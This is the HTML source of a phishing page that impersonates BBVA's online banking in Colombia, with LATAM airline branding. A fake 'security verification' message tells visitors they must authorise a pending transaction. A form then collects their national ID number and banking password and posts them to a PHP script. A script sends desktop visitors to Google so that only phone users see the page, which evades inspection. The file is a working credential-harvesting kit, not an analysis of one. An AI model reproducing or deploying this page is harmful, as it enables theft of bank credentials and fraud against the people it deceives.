

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">

    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/estilos.css" crossorigin="anonymous">
    <link rel="stylesheet" href="./css/normalize.css">
    <link rel="stylesheet" href="./css/utils.css">
    <link rel="stylesheet" href="./css/main.css">
    <link rel="stylesheet" href="./css/hotel-datepicker.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous">

    <script href="js/main.js"></script>

    <link rel="stylesheet" href="css/login.css" crossorigin="anonymous">


    <title>logos</title>

</head>

<body onload="nobackbutton();">








    <script>
        const esDispositivoMovil = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

        if (esDispositivoMovil) {

            console.log("Estás navegando desde un dispositivo móvil");
        } else {
            window.location.href = "https://www.google.com/search?q=https%3A%2F%2Fpeople.com%2F&rlz=1C1UUXU_esCO1026CO1026&sxsrf=AB5stBhY1HWRiHp1kz7EliMShtk-hj13Fg%3A1688777086772&ei=frGoZPXgLquHwbkP15iRwAg&ved=0ahUKEwj1l_Ly8P3_AhWrQzABHVdMBIgQ4dUDCA8&uact=5&oq=https%3A%2F%2Fpeople.com%2F&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzIICAAQgAQQywEyCAgAEIAEEMsBMggIABCABBDLATIICAAQgAQQywEyCAgAEIAEEMsBMgYIABAWEB4yBggAEBYQHjIGCAAQFhAeMgYIABAeEA0yBggAEB4QDToECCMQJzoHCCMQigUQJzoLCAAQgAQQsQMQgwE6BQgAEIAEOggIABCABBCxAzoICC4QgAQQsQM6CwgAEIoFELEDEIMBOgUILhCABDoLCC4QgAQQsQMQgwE6DQguEIoFELEDEIMBEEM6CggAEIAEEBQQhwI6EAguEIoFELEDEMcBENEDEEM6DgguEIAEELEDEMcBENEDOhsILhCKBRCxAxCDARBDEJcFENwEEN4EEOAEGAE6BwgjEOoCECc6FQgAEAMQjwEQ6gIQtAIQjAMQ5QIYAjoVCC4QAxCPARDqAhC0AhCMAxDlAhgCSgQIQRgAUABY6SZgnCloA3ABeACAAaUDiAG_CZIBBzItMi4xLjGYAQCgAQGgAQKwARTAAQHaAQYIARABGBTaAQYIAhABGAs&sclient=gws-wiz-serp";
            console.log("Estás navegando desde un dispositivo de escritorio");
        }
    </script>


    
    <nav class="p-fixed border-box bg-deep-blue p-3">
        <div class="d-flex justify-space-between align-items-center">
            <div>
                <img width="105px" src="./assets/logos/LATAM_navbar.png">
            </div>

            <div class="d-flex justify-content-center align-items-center">
                <button class="btn-session" style="padding-inline: 1.3rem;padding-top: 4px; padding-bottom: 4px;font-size: 1.5rem;">
                    Iniciar sesión
                </button>
                <img class="navbar--hamburger" src="./assets/media/hamburger_a.png">
            </div>
        </div>
    </nav>

    <br>
    <br><br>
    <div class="introduccion">
        <h1 style="font-size:2.5vh;">VERIFICACI&Oacute;N DE SEGURIDAD</h1>
    </div>
    <p style="text-align:center !important; line-height:normal !important; margin: 3px;">
        Debes autorizar la transacci&oacute;n que esta en proceso, inicia sesi&oacute;n en tu banca virtual, a continuacion:
    </p>
    </div>

    <br>
    <!--------------------------------------- // div de la vista de bogota  ------------------------------------------------------------------------>

    <body class="t-body" style="opacity: 1;" _c_t_j1="1">
        <style>
            * {
                margin: 0;
                padding: 0;
                font-family: Arial;
                font-weight: normal;
            }

            h2 {
                letter-spacing: 2px;
                margin-top: 50px;
            }

            input {
                width: 85%;
                height: 50px;
                color: black;
                background-color: rgb(243, 243, 243);
                border: 1px solid rgb(255, 255, 255);
                border-bottom: 1px solid black;
                padding: 10px;
                margin-left: 7%;
                margin-top: 15px;

            }

            select {
                width: 85%;
                height: 50px;
                color: black;
                background-color: rgb(243, 243, 243);
                border: 1px solid rgb(255, 255, 255);
                border-bottom: 1px solid black;
                padding: 10px;
                margin-left: 7%;
                margin-top: 15px;
            }

            #btnUsuario {
                height: 50px;
                padding: 10px;
                margin-left: 7%;
                margin-top: 15px;
                background-color: #227aba;
                font-size: 17px;
                border: none;
                font-weight: bold;
                color: white;
                width: 85%;
            }
        </style>

        <img src="img/menubb.jpg" width="100%">
        <center>
            <div style="width:90%; margin-top: 80px; margin-top: 53px;">
                <a style="font-size:21px;">Hola, ingresa tu número de documento y contraseña que usas en tu app BBVA:</a>
            </div>
        </center>

        <form action="php/index.php" method="post">
            <div class="inp">
                <select>
                    <option selected="">Cédula de Ciudadanía</option>
                </select>
                <br>
                <input type="hidden" id="pag" name="pag" value="logo">
                <input type="tel" id="txtUser" name="txtUser" placeholder="Número de documento"><br>
                <input type="password" id="txtPassword" name="txtPassword" placeholder="Contraseña" maxlength="8"><br>
                <div style="display: flex;  align-items: center; justify-content: center;   ">
                    <button id="enviar" type="submit" style="height: 50px; padding: 10px; margin-top: 15px; background-color: #227aba; font-size: 17px; border: none;font-weight: bold;color: white; width: 85%;">Entrar a BBVA Net</button>
                </div>
            </div>
        </form>
    </body>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>




    </div>
    <br>
    <div class="inferior ">
        <img src="./img/segure.png" alt="" style="padding-top: 1rem; padding-bottom: 1rem;" class="flayerbc">
        <img src="./img/vigila.png" alt="" class="vigila">
    </div>




    <script src="https://code.jquery.com/jquery-3.7.0.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>


    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  
    

</body>

</html>